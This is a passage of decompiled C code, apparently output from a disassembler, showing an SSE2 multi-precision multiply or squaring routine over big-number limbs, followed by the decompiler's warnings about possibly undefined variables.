           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v314 = _mm_move_epi64(v311);
  v315 = _mm_move_epi64(v312);
  v316 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v311, v314), v314), 4);
  v317 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v301, v301), _mm_and_si128(v308, v307)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v316);
  v318 = (__m128i)_mm_movehl_ps(v316, v317);
  *(_DWORD *)(v319 + 112) = _mm_cvtsi128_si32((__m128i)v317);
  v320 = (__m128)_mm_add_epi32(v313, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v312, v315), v315), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v320);
  v321 = _mm_add_epi64(_mm_srli_epi64((__m128i)v317, 0x10u), (__m128i)v320);
  *(_QWORD *)(v319 + 114) = v321.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v321, 0x30u), v318).m128i_u64[0];
  v322 = _mm_load_si128(&v669);
  v323 = _mm_mul_epu32(_mm_load_si128(&v668), v322);
  v324 = _mm_load_si128(&stru_46C990);
  v325 = _mm_and_si128(v324, v323);
  v326 = _mm_srli_epi32(v323, 0x10u);
  v328 = _mm_mul_epu32(v322, *v327);
  v329 = _mm_and_si128(v324, v328);
  v330 = _mm_srli_epi32(v328, 0x10u);
  sub_419D5A();
  v331 = _mm_add_epi32(v329, v329);
  v332 = _mm_add_epi32(v330, v330);
  v333 = _mm_add_epi32(_mm_add_epi32(v326, v326), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v334 = _mm_move_epi64(v331);
  v335 = _mm_move_epi64(v332);
  v336 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v331, v334), v334), 4);
  v337 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v325, v325), _mm_loadl_epi64(&v660)), (__m128i)v336);
  v338 = (__m128i)_mm_movehl_ps(v336, v337);
  *(_DWORD *)(v339 + 120) = _mm_cvtsi128_si32((__m128i)v337);
  v340 = (__m128)_mm_add_epi32(v333, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v332, v335), v335), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v340);
  v341 = _mm_add_epi64(_mm_srli_epi64((__m128i)v337, 0x10u), (__m128i)v340);
  *(_QWORD *)(v339 + 122) = v341.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v341, 0x30u), v338).m128i_u64[0];
  v342 = _mm_load_si128(&v670);
  v343 = _mm_mul_epu32(_mm_load_si128(&v668), v342);
  v344 = _mm_load_si128(&stru_46C990);
  v345 = _mm_and_si128(v344, v343);
  v346 = _mm_srli_epi32(v343, 0x10u);
  v348 = _mm_mul_epu32(v342, *(__m128i *)(v347 - 16));
  sub_419D9A();
  v349 = _mm_load_si128(&v669);
  v350 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v669.m128i_i8[8]), v349);
  v351 = _mm_mul_epu32(v349, v349);
  v352 = _mm_load_si128(&stru_46C990);
  v353 = _mm_add_epi32(_mm_and_si128(v344, v348), _mm_and_si128(v352, v350));
  v354 = _mm_add_epi32(_mm_srli_epi32(v348, 0x10u), _mm_srli_epi32(v350, 0x10u));
  v355 = _mm_add_epi32(v353, v353);
  v356 = _mm_add_epi32(v354, v354);
  v357 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v346, v346), _mm_srli_epi32(v351, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v358 = _mm_move_epi64(v355);
  v359 = _mm_move_epi64(v356);
  v360 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v355, v358), v358), 4);
  v361 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v345, v345), _mm_and_si128(v352, v351)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v360);
  v362 = (__m128i)_mm_movehl_ps(v360, v361);
  *(_DWORD *)(v363 + 128) = _mm_cvtsi128_si32((__m128i)v361);
  v364 = (__m128)_mm_add_epi32(v357, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v356, v359), v359), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v364);
  v365 = _mm_add_epi64(_mm_srli_epi64((__m128i)v361, 0x10u), (__m128i)v364);
  *(_QWORD *)(v363 + 130) = v365.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v365, 0x30u), v362).m128i_u64[0];
  v366 = _mm_load_si128(&v670);
  v367 = _mm_mul_epu32(_mm_load_si128(&v669), v366);
  v368 = _mm_load_si128(&stru_46C990);
  v369 = _mm_and_si128(v368, v367);
  v370 = _mm_srli_epi32(v367, 0x10u);
  v372 = _mm_mul_epu32(v366, *v371);
  v373 = _mm_and_si128(v368, v372);
  v374 = _mm_srli_epi32(v372, 0x10u);
  sub_419D9A();
  v375 = _mm_add_epi32(v373, v373);
  v376 = _mm_add_epi32(v374, v374);
  v377 = _mm_add_epi32(_mm_add_epi32(v370, v370), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v378 = _mm_move_epi64(v375);
  v379 = _mm_move_epi64(v376);
  v380 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v375, v378), v378), 4);
  v381 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v369, v369), _mm_loadl_epi64(&v660)), (__m128i)v380);
  v382 = (__m128i)_mm_movehl_ps(v380, v381);
  *(_DWORD *)(v383 + 136) = _mm_cvtsi128_si32((__m128i)v381);
  v384 = (__m128)_mm_add_epi32(v377, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v376, v379), v379), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v384);
  v385 = _mm_add_epi64(_mm_srli_epi64((__m128i)v381, 0x10u), (__m128i)v384);
  *(_QWORD *)(v383 + 138) = v385.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v385, 0x30u), v382).m128i_u64[0];
  v386 = _mm_load_si128(&v671);
  v387 = _mm_mul_epu32(_mm_load_si128(&v669), v386);
  v388 = _mm_load_si128(&stru_46C990);
  v389 = _mm_and_si128(v388, v387);
  v390 = _mm_srli_epi32(v387, 0x10u);
  v392 = _mm_mul_epu32(v386, *(__m128i *)(v391 - 16));
  sub_419DD7();
  v393 = _mm_load_si128(&v670);
  v394 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v670.m128i_i8[8]), v393);
  v395 = _mm_mul_epu32(v393, v393);
  v396 = _mm_load_si128(&stru_46C990);
  v397 = _mm_add_epi32(_mm_and_si128(v388, v392), _mm_and_si128(v396, v394));
  v398 = _mm_add_epi32(_mm_srli_epi32(v392, 0x10u), _mm_srli_epi32(v394, 0x10u));
  v399 = _mm_add_epi32(v397, v397);
  v400 = _mm_add_epi32(v398, v398);
  v401 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v390, v390), _mm_srli_epi32(v395, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v402 = _mm_move_epi64(v399);
  v403 = _mm_move_epi64(v400);
  v404 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v399, v402), v402), 4);
  v405 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v389, v389), _mm_and_si128(v396, v395)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v404);
  v406 = (__m128i)_mm_movehl_ps(v404, v405);
  *(_DWORD *)(v407 + 144) = _mm_cvtsi128_si32((__m128i)v405);
  v408 = (__m128)_mm_add_epi32(v401, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v400, v403), v403), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v408);
  v409 = _mm_add_epi64(_mm_srli_epi64((__m128i)v405, 0x10u), (__m128i)v408);
  *(_QWORD *)(v407 + 146) = v409.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v409, 0x30u), v406).m128i_u64[0];
  v410 = _mm_load_si128(&v671);
  v411 = _mm_mul_epu32(_mm_load_si128(&v670), v410);
  v412 = _mm_load_si128(&stru_46C990);
  v413 = _mm_and_si128(v412, v411);
  v414 = _mm_srli_epi32(v411, 0x10u);
  v416 = _mm_mul_epu32(v410, *v415);
  v417 = _mm_and_si128(v412, v416);
  v418 = _mm_srli_epi32(v416, 0x10u);
  sub_419DD7();
  v419 = _mm_add_epi32(v417, v417);
  v420 = _mm_add_epi32(v418, v418);
  v421 = _mm_add_epi32(_mm_add_epi32(v414, v414), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v422 = _mm_move_epi64(v419);
  v423 = _mm_move_epi64(v420);
  v424 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v419, v422), v422), 4);
  v425 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v413, v413), _mm_loadl_epi64(&v660)), (__m128i)v424);
  v426 = (__m128i)_mm_movehl_ps(v424, v425);
  *(_DWORD *)(v427 + 152) = _mm_cvtsi128_si32((__m128i)v425);
  v428 = (__m128)_mm_add_epi32(v421, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v420, v423), v423), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v428);
  v429 = _mm_add_epi64(_mm_srli_epi64((__m128i)v425, 0x10u), (__m128i)v428);
  *(_QWORD *)(v427 + 154) = v429.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v429, 0x30u), v426).m128i_u64[0];
  v430 = _mm_load_si128(&v672);
  v431 = _mm_mul_epu32(_mm_load_si128(&v670), v430);
  v432 = _mm_load_si128(&stru_46C990);
  v433 = _mm_and_si128(v432, v431);
  v434 = _mm_srli_epi32(v431, 0x10u);
  v436 = _mm_mul_epu32(v430, *(__m128i *)(v435 - 16));
  sub_419E14();
  v437 = _mm_load_si128(&v671);
  v438 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v671.m128i_i8[8]), v437);
  v439 = _mm_mul_epu32(v437, v437);
  v440 = _mm_load_si128(&stru_46C990);
  v441 = _mm_add_epi32(_mm_and_si128(v432, v436), _mm_and_si128(v440, v438));
  v442 = _mm_add_epi32(_mm_srli_epi32(v436, 0x10u), _mm_srli_epi32(v438, 0x10u));
  v443 = _mm_add_epi32(v441, v441);
  v444 = _mm_add_epi32(v442, v442);
  v445 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v434, v434), _mm_srli_epi32(v439, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v446 = _mm_move_epi64(v443);
  v447 = _mm_move_epi64(v444);
  v448 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v443, v446), v446), 4);
  v449 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v433, v433), _mm_and_si128(v440, v439)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v448);
  v450 = (__m128i)_mm_movehl_ps(v448, v449);
  *(_DWORD *)(v451 + 160) = _mm_cvtsi128_si32((__m128i)v449);
  v452 = (__m128)_mm_add_epi32(v445, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v444, v447), v447), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v452);
  v453 = _mm_add_epi64(_mm_srli_epi64((__m128i)v449, 0x10u), (__m128i)v452);
  *(_QWORD *)(v451 + 162) = v453.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v453, 0x30u), v450).m128i_u64[0];
  v454 = _mm_load_si128(&v672);
  v455 = _mm_mul_epu32(_mm_load_si128(&v671), v454);
  v456 = _mm_load_si128(&stru_46C990);
  v457 = _mm_and_si128(v456, v455);
  v458 = _mm_srli_epi32(v455, 0x10u);
  v460 = _mm_mul_epu32(v454, *v459);
  v461 = _mm_and_si128(v456, v460);
  v462 = _mm_srli_epi32(v460, 0x10u);
  sub_419E14();
  v463 = _mm_add_epi32(v461, v461);
  v464 = _mm_add_epi32(v462, v462);
  v465 = _mm_add_epi32(_mm_add_epi32(v458, v458), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v466 = _mm_move_epi64(v463);
  v467 = _mm_move_epi64(v464);
  v468 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v463, v466), v466), 4);
  v469 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v457, v457), _mm_loadl_epi64(&v660)), (__m128i)v468);
  v470 = (__m128i)_mm_movehl_ps(v468, v469);
  *(_DWORD *)(v471 + 168) = _mm_cvtsi128_si32((__m128i)v469);
  v472 = (__m128)_mm_add_epi32(v465, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v464, v467), v467), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v472);
  v473 = _mm_add_epi64(_mm_srli_epi64((__m128i)v469, 0x10u), (__m128i)v472);
  *(_QWORD *)(v471 + 170) = v473.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v473, 0x30u), v470).m128i_u64[0];
  v474 = _mm_load_si128(&v673);
  v475 = _mm_mul_epu32(_mm_load_si128(&v671), v474);
  v476 = _mm_load_si128(&stru_46C990);
  v477 = _mm_and_si128(v476, v475);
  v478 = _mm_srli_epi32(v475, 0x10u);
  v480 = _mm_mul_epu32(v474, *(__m128i *)(v479 - 16));
  sub_419E51();
  v481 = _mm_load_si128(&v672);
  v482 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v672.m128i_i8[8]), v481);
  v483 = _mm_mul_epu32(v481, v481);
  v484 = _mm_load_si128(&stru_46C990);
  v485 = _mm_add_epi32(_mm_and_si128(v476, v480), _mm_and_si128(v484, v482));
  v486 = _mm_add_epi32(_mm_srli_epi32(v480, 0x10u), _mm_srli_epi32(v482, 0x10u));
  v487 = _mm_add_epi32(v485, v485);
  v488 = _mm_add_epi32(v486, v486);
  v489 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v478, v478), _mm_srli_epi32(v483, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v490 = _mm_move_epi64(v487);
  v491 = _mm_move_epi64(v488);
  v492 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v487, v490), v490), 4);
  v493 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v477, v477), _mm_and_si128(v484, v483)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v492);
  v494 = (__m128i)_mm_movehl_ps(v492, v493);
  *(_DWORD *)(v495 + 176) = _mm_cvtsi128_si32((__m128i)v493);
  v496 = (__m128)_mm_add_epi32(v489, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v488, v491), v491), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v496);
  v497 = _mm_add_epi64(_mm_srli_epi64((__m128i)v493, 0x10u), (__m128i)v496);
  *(_QWORD *)(v495 + 178) = v497.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v497, 0x30u), v494).m128i_u64[0];
  v498 = _mm_load_si128(&v673);
  v499 = _mm_mul_epu32(_mm_load_si128(&v672), v498);
  v500 = _mm_load_si128(&stru_46C990);
  v501 = _mm_and_si128(v500, v499);
  v502 = _mm_srli_epi32(v499, 0x10u);
  v504 = _mm_mul_epu32(v498, *v503);
  v505 = _mm_and_si128(v500, v504);
  v506 = _mm_srli_epi32(v504, 0x10u);
  sub_419E51();
  v507 = _mm_add_epi32(v505, v505);
  v508 = _mm_add_epi32(v506, v506);
  v509 = _mm_add_epi32(_mm_add_epi32(v502, v502), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v510 = _mm_move_epi64(v507);
  v511 = _mm_move_epi64(v508);
  v512 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v507, v510), v510), 4);
  v513 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v501, v501), _mm_loadl_epi64(&v660)), (__m128i)v512);
  v514 = (__m128i)_mm_movehl_ps(v512, v513);
  *(_DWORD *)(v515 + 184) = _mm_cvtsi128_si32((__m128i)v513);
  v516 = (__m128)_mm_add_epi32(v509, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v508, v511), v511), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v516);
  v517 = _mm_add_epi64(_mm_srli_epi64((__m128i)v513, 0x10u), (__m128i)v516);
  *(_QWORD *)(v515 + 186) = v517.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v517, 0x30u), v514).m128i_u64[0];
  v518 = _mm_load_si128(&v674);
  v519 = _mm_mul_epu32(_mm_load_si128(&v672), v518);
  v520 = _mm_load_si128(&stru_46C990);
  v521 = _mm_and_si128(v520, v519);
  v522 = _mm_srli_epi32(v519, 0x10u);
  v524 = _mm_mul_epu32(v518, *(__m128i *)(v523 - 16));
  sub_419E8E();
  v525 = _mm_load_si128(&v673);
  v526 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v673.m128i_i8[8]), v525);
  v527 = _mm_mul_epu32(v525, v525);
  v528 = _mm_load_si128(&stru_46C990);
  v529 = _mm_add_epi32(_mm_and_si128(v520, v524), _mm_and_si128(v528, v526));
  v530 = _mm_add_epi32(_mm_srli_epi32(v524, 0x10u), _mm_srli_epi32(v526, 0x10u));
  v531 = _mm_add_epi32(v529, v529);
  v532 = _mm_add_epi32(v530, v530);
  v533 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v522, v522), _mm_srli_epi32(v527, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v534 = _mm_move_epi64(v531);
  v535 = _mm_move_epi64(v532);
  v536 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v531, v534), v534), 4);
  v537 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v521, v521), _mm_and_si128(v528, v527)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v536);
  v538 = (__m128i)_mm_movehl_ps(v536, v537);
  *(_DWORD *)(v539 + 192) = _mm_cvtsi128_si32((__m128i)v537);
  v540 = (__m128)_mm_add_epi32(v533, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v532, v535), v535), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v540);
  v541 = _mm_add_epi64(_mm_srli_epi64((__m128i)v537, 0x10u), (__m128i)v540);
  *(_QWORD *)(v539 + 194) = v541.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v541, 0x30u), v538).m128i_u64[0];
  v542 = _mm_load_si128(&v674);
  v543 = _mm_mul_epu32(_mm_load_si128(&v673), v542);
  v544 = _mm_load_si128(&stru_46C990);
  v545 = _mm_and_si128(v544, v543);
  v546 = _mm_srli_epi32(v543, 0x10u);
  v548 = _mm_mul_epu32(v542, *v547);
  v549 = _mm_and_si128(v544, v548);
  v550 = _mm_srli_epi32(v548, 0x10u);
  sub_419E8E();
  v551 = _mm_add_epi32(v549, v549);
  v552 = _mm_add_epi32(v550, v550);
  v553 = _mm_add_epi32(_mm_add_epi32(v546, v546), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v554 = _mm_move_epi64(v551);
  v555 = _mm_move_epi64(v552);
  v556 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v551, v554), v554), 4);
  v557 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v545, v545), _mm_loadl_epi64(&v660)), (__m128i)v556);
  v558 = (__m128i)_mm_movehl_ps(v556, v557);
  *(_DWORD *)(v559 + 200) = _mm_cvtsi128_si32((__m128i)v557);
  v560 = (__m128)_mm_add_epi32(v553, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v552, v555), v555), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v560);
  v561 = _mm_add_epi64(_mm_srli_epi64((__m128i)v557, 0x10u), (__m128i)v560);
  *(_QWORD *)(v559 + 202) = v561.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v561, 0x30u), v558).m128i_u64[0];
  v562 = _mm_load_si128(&v675);
  v563 = _mm_mul_epu32(_mm_load_si128(&v673), v562);
  v564 = _mm_load_si128(&stru_46C990);
  v565 = _mm_and_si128(v564, v563);
  v566 = _mm_srli_epi32(v563, 0x10u);
  v568 = _mm_mul_epu32(v562, *(__m128i *)(v567 - 16));
  sub_419ECB((int)&v674, &v674);
  v569 = _mm_load_si128(&v674);
  v570 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v674.m128i_i8[8]), v569);
  v571 = _mm_mul_epu32(v569, v569);
  v572 = _mm_load_si128(&stru_46C990);
  v573 = _mm_add_epi32(_mm_and_si128(v564, v568), _mm_and_si128(v572, v570));
  v574 = _mm_add_epi32(_mm_srli_epi32(v568, 0x10u), _mm_srli_epi32(v570, 0x10u));
  v575 = _mm_add_epi32(v573, v573);
  v576 = _mm_add_epi32(v574, v574);
  v577 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v566, v566), _mm_srli_epi32(v571, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v578 = _mm_move_epi64(v575);
  v579 = _mm_move_epi64(v576);
  v580 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v575, v578), v578), 4);
  v581 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v565, v565), _mm_and_si128(v572, v571)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v580);
  v582 = (__m128i)_mm_movehl_ps(v580, v581);
  *(_DWORD *)(v583 + 208) = _mm_cvtsi128_si32((__m128i)v581);
  v584 = (__m128)_mm_add_epi32(v577, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v576, v579), v579), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v584);
  v585 = _mm_add_epi64(_mm_srli_epi64((__m128i)v581, 0x10u), (__m128i)v584);
  *(_QWORD *)(v583 + 210) = v585.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v585, 0x30u), v582).m128i_u64[0];
  v586 = _mm_load_si128(&v675);
  v587 = _mm_mul_epu32(_mm_load_si128(&v674), v586);
  v588 = _mm_load_si128(&stru_46C990);
  v589 = _mm_and_si128(v588, v587);
  v590 = _mm_srli_epi32(v587, 0x10u);
  v592 = _mm_mul_epu32(v586, *v591);
  v593 = _mm_and_si128(v588, v592);
  v594 = _mm_srli_epi32(v592, 0x10u);
  sub_419ECB((int)&v675, &v674);
  v596 = _mm_add_epi32(v593, v593);
  v597 = _mm_add_epi32(v594, v594);
  v598 = _mm_add_epi32(_mm_add_epi32(v590, v590), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v599 = _mm_move_epi64(v596);
  v600 = _mm_move_epi64(v597);
  v601 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v596, v599), v599), 4);
  v602 = (__m128)_mm_add_epi32(_mm_add_epi32(_mm_add_epi32(v589, v589), _mm_loadl_epi64(&v660)), (__m128i)v601);
  v603 = (__m128i)_mm_movehl_ps(v601, v602);
  *(_DWORD *)(v604 + 216) = _mm_cvtsi128_si32((__m128i)v602);
  v605 = (__m128)_mm_add_epi32(v598, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v597, v600), v600), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v605);
  v606 = _mm_add_epi64(_mm_srli_epi64((__m128i)v602, 0x10u), (__m128i)v605);
  *(_QWORD *)(v604 + 218) = v606.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v606, 0x30u), v603).m128i_u64[0];
  v607 = _mm_load_si128(&v676);
  v608 = _mm_mul_epu32(_mm_load_si128(&v674), v607);
  v609 = _mm_load_si128(&stru_46C990);
  v610 = _mm_and_si128(v609, v608);
  v611 = _mm_srli_epi32(v608, 0x10u);
  v613 = _mm_mul_epu32(v607, v612[-1]);
  v614 = _mm_load_si128(&v675);
  v615 = _mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v675.m128i_i8[8]), v614);
  v616 = _mm_mul_epu32(v614, v614);
  v617 = v609;
  v618 = _mm_add_epi32(_mm_and_si128(v609, v613), _mm_and_si128(v609, v615));
  v619 = _mm_add_epi32(_mm_srli_epi32(v613, 0x10u), _mm_srli_epi32(v615, 0x10u));
  v620 = _mm_add_epi32(v618, v618);
  v621 = _mm_add_epi32(v619, v619);
  v622 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v611, v611), _mm_srli_epi32(v616, 0x10u)),
           _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8]));
  v623 = _mm_move_epi64(v620);
  v624 = _mm_move_epi64(v621);
  v625 = (__m128)_mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v620, v623), v623), 4);
  v626 = (__m128)_mm_add_epi32(
                   _mm_add_epi32(
                     _mm_add_epi32(_mm_add_epi32(v610, v610), _mm_and_si128(v617, v616)),
                     _mm_loadl_epi64(&v660)),
                   (__m128i)v625);
  v627 = (__m128i)_mm_movehl_ps(v625, v626);
  *(_DWORD *)(v604 + 224) = _mm_cvtsi128_si32((__m128i)v626);
  v628 = (__m128)_mm_add_epi32(v622, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v621, v624), v624), 4));
  _mm_storeh_ps((double *)&v660.m128i_i64[1], v628);
  v629 = _mm_add_epi64(_mm_srli_epi64((__m128i)v626, 0x10u), (__m128i)v628);
  *(_QWORD *)(v604 + 226) = v629.m128i_i64[0];
  v660.m128i_i64[0] = _mm_add_epi32(_mm_srli_epi64(v629, 0x30u), v627).m128i_u64[0];
  ++v612;
  v630 = _mm_load_si128(&v676);
  v631 = _mm_mul_epu32(_mm_load_si128(&v675), v630);
  v632 = _mm_load_si128(&stru_46C990);
  v633 = _mm_and_si128(v632, v631);
  v634 = _mm_srli_epi32(v631, 0x10u);
  v635 = _mm_mul_epu32(v630, v612[-1]);
  v636 = _mm_and_si128(v632, v635);
  v637 = _mm_srli_epi32(v635, 0x10u);
  v638 = _mm_add_epi32(v636, v636);
  v639 = _mm_add_epi32(v637, v637);
  v640 = _mm_move_epi64(v638);
  v641 = _mm_move_epi64(v639);
  v642 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v633, v633), _mm_loadl_epi64(&v660)),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v638, v640), v640), 4));
  v643 = _mm_add_epi32(
           _mm_add_epi32(_mm_add_epi32(v634, v634), _mm_loadl_epi64((const __m128i *)&v660.m128i_i8[8])),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v639, v641), v641), 4));
  *(_DWORD *)(v604 + 232) = _mm_cvtsi128_si32(v642);
  v644 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v642), 0x10u), _mm_move_epi64(v643));
  v645 = _mm_unpackhi_epi64(v643, v640);
  *(_QWORD *)(v604 + 234) = v644.m128i_i64[0];
  v646 = _mm_add_epi32(_mm_unpackhi_epi64(v642, v640), _mm_srli_epi64(v644, 0x30u));
  v647 = _mm_load_si128(&v676);
  v648 = _mm_mul_epu32(v647, v647);
  v649 = _mm_mul_epu32(v647, *v612);
  v650 = _mm_load_si128(&stru_46C990);
  v651 = _mm_and_si128(v650, v648);
  v652 = _mm_add_epi32(v645, _mm_srli_epi32(v648, 0x10u));
  v653 = _mm_and_si128(v650, v649);
  v654 = _mm_srli_epi32(v649, 0x10u);
  v655 = _mm_move_epi64(v653);
  v656 = _mm_move_epi64(v654);
  v657 = _mm_add_epi32(
           _mm_add_epi32(v646, v651),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v653, v655), v655), 4));
  v658 = _mm_add_epi32(v652, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v654, v656), v656), 4));
  *(_DWORD *)(v604 + 240) = _mm_cvtsi128_si32(v657);
  v659 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v657), 0x10u), _mm_move_epi64(v658));
  *(_QWORD *)(v604 + 242) = v659.m128i_i64[0];
  *(_QWORD *)(v604 + 248) = _mm_add_epi64(
                              _mm_add_epi32(_mm_unpackhi_epi64(v657, v655), _mm_srli_epi64(v659, 0x30u)),
                              _mm_slli_epi64(_mm_unpackhi_epi64(v658, v655), 0x10u)).m128i_u64[0];
  return result;
}
// 41A16F: variable 'v75' is possibly undefined
// 41A1BC: variable 'v83' is possibly undefined
// 41A257: variable 'v99' is possibly undefined
// 41A2A7: variable 'v107' is possibly undefined
// 41A307: variable 'v119' is possibly undefined
// 41A354: variable 'v127' is possibly undefined
// 41A3EF: variable 'v143' is possibly undefined
// 41A43F: variable 'v151' is possibly undefined
